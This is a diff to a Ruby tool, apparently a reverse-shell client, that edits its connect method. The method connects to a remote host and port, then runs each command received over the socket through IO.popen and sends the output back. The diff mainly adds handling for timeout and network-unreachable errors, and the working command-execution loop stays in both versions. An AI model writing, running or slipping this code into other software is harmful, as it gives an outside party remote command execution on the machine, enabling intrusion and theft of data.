@@ -83,31 +83,39 @@ class Kai
     exit
   end
 
-  def connect
-    socket = nil
-    begin
-      socket = TCPSocket.new(@options.rhost, @options.port)
-    rescue SocketError, Errno::EHOSTUNREACH, Errno::ECONNREFUSED => err
-      puts '------------------------------------------------------------------------'.red
-      puts "[!] ".red + "Error [1]: #{err}"
-      puts '------------------------------------------------------------------------'.red
-      puts "[!] ".red + 'Exiting ..'
-      puts '------------------------------------------------------------------------'.red
-      exit
-    end
 
-    puts "[*] Starting at: (#{Time.now}) Operating System: (#{RUBY_PLATFORM})"
-    puts '------------------------------------------------------------------------'.green
-    puts "[*] Status: (Connection Established!)"
-    puts "[*] Remote Host: (#{@options.rhost}) Remote Port: (#{@options.port})"
-    puts '------------------------------------------------------------------------'.green
-    puts "[*] Exiting at: (#{Time.now})"
-    puts '------------------------------------------------------------------------'.green
+def connect
+      socket = nil
+      begin
+        socket = TCPSocket.new(@options.rhost, @options.port)
+      rescue SocketError, Errno::EHOSTUNREACH, Errno::ECONNREFUSED => err
+        puts '------------------------------------------------------------------------'.red
+        puts "[!] ".red + "Error [1]: #{err}"
+        puts '------------------------------------------------------------------------'.red
+        puts "[!] ".red + 'Exiting ..'
+        puts '------------------------------------------------------------------------'.red
+        exit
+      rescue Errno::ETIMEDOUT, Errno::ENETUNREACH => err
+        puts '------------------------------------------------------------------------'.red
+        puts "[!] ".red + "Error [2]: #{err}"
+        puts '------------------------------------------------------------------------'.red
+        puts "[!] ".red + 'Exiting ..'
+        puts '------------------------------------------------------------------------'.red
+        exit
+      end
 
-    while (cmd = socket.gets)
-      IO.popen(cmd, 'r') { |io| socket.print io.read }
+      puts "[*] Starting at: (#{Time.now}) Operating System: (#{RUBY_PLATFORM})"
+      puts '------------------------------------------------------------------------'.green
+      puts "[*] Status: (Connection Established!)"
+      puts "[*] Remote Host: (#{@options.rhost}) Remote Port: (#{@options.port})"
+      puts '------------------------------------------------------------------------'.green
+      puts "[*] Exiting at: (#{Time.now})"
+      puts '------------------------------------------------------------------------'.green
+
+      while (cmd = socket.gets)
+        IO.popen(cmd, 'r') { |io| socket.print io.read }
+      end
     end
-  end
 
   def run(arguments)
     parser(arguments)
